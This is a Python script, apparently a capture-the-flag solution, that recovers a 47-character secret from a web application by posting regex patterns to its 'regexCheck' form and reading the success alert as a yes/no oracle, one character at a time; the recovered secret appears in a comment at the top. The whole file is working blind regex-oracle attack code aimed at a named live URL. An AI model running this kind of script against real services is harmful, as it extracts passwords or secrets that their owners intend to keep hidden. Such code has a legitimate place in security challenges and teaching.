#!/usr/bin/python3
# Secret = "Y0U_Sh0uld_V0te_but_Pl3asE_Dont-V0TE_TRUMP!!-_-"

import requests
from bs4 import BeautifulSoup
from string import ascii_lowercase, ascii_uppercase

def checkRegex(regex):
	URL = 'https://learn-gcp-286602.uc.r.appspot.com/'

	regexInput = regex
	data = {'regexCheck' : regexInput}
	queryResult = requests.post(URL, data)
	page = queryResult.content

	soup = BeautifulSoup(page, 'html.parser')
	resultDiv = soup.find('div', class_='alert')
	if resultDiv:
		return 'alert-success' in resultDiv.get_attribute_list('class')
	else:
		return None

# Password size and possible characters were found by doing quick manual inputs
passwordSize = 47
possibleCharacters = ['[a-z]', '[A-Z]', '[0-9]', '_', '-', '!']

passwordList = []
#passwordList = ['Y', '0', 'U']
#passwordList = ['Y', '0', 'U', '_', 'S', 'h', '0', 'u', 'l', 'd', '_', 'V', '0', 't', 'e', '_', 'b', 'u', 't', '_', 'P', 'l', '3', 'a', 's', 'E', '_', 'D', 'o', 'n', 't', '-', 'V', '0', 'T', 'E', '_', 'T', 'R', 'U', 'M', 'P', '!', '!', '-', '_', '-']

for position in range(len(passwordList), passwordSize):
	password = ''.join(passwordList)
	for charType in possibleCharacters:
		regexInput = '^{}{}'.format(password, charType)
		if checkRegex(regexInput):
			print('{}. Char type = {} -> '.format(position, charType), end='')
			correctCharType = charType
			break
	
	if correctCharType == '[a-z]':
		for c in ascii_lowercase:
			regexInput = '^{}{}'.format(password, c)
			if checkRegex(regexInput):
				print('char = {}'.format(c))
				passwordList.append(c)
				break
	elif correctCharType == '[A-Z]':
		for c in ascii_uppercase:
			regexInput = '^{}{}'.format(password, c)
			if checkRegex(regexInput):
				print('char = {}'.format(c))
				passwordList.append(c)
				break
	elif correctCharType == '[0-9]':
		for c in range(10):
			regexInput = '^{}{}'.format(password, c)
			if checkRegex(regexInput):
				print('char = {}'.format(c))
				passwordList.append(str(c))
				break
	else:
		c = correctCharType
		print('char = {}'.format(c))
		passwordList.append(c)

password = ''.join(passwordList)
print(password)
